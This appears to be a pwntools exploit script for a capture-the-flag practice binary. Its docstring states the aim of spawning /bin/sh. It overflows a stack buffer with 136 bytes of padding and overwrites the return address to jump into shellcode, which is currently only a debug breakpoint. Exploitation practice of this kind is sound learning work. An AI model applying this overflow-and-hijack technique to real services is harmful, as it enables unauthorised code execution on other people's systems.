#!/usr/bin/python

'''
allocate a shellcode on the stack that launches `/bin/sh` and jump to it.
Assume that the shellcode address on the stack is known. No need to deal with
[cache
coherency](https://blog.senr.io/blog/why-is-my-perfectly-good-shellcode-not-working-cache-coherency-on-mips-and-arm)
on ARM, MIPS and PowerPC.
'''

import struct
import sys

from pwn import *


context(arch='amd64', os='linux', endian='little', word_size=64)

binary_path = '/home/gbrls/ctf/easy-linux-pwn/bin/x86-64/04-shellcode-static'

#p = process(binary_path)
p = gdb.debug(binary_path, '''
    set follow-fork-mode child
''')


libc_off = 0x7ffff7dd9000 - 0x28000

# we assume this address is known
buf_start = 0x7fff5fa55950
shellcode = b''
shellcode += asm('int3')

# offset padding
payload = b''
payload += shellcode
payload += b'A' * (136 - len(shellcode))
payload += p64(buf_start)

p.readuntil('> ')
p.write(payload)
p.interactive()
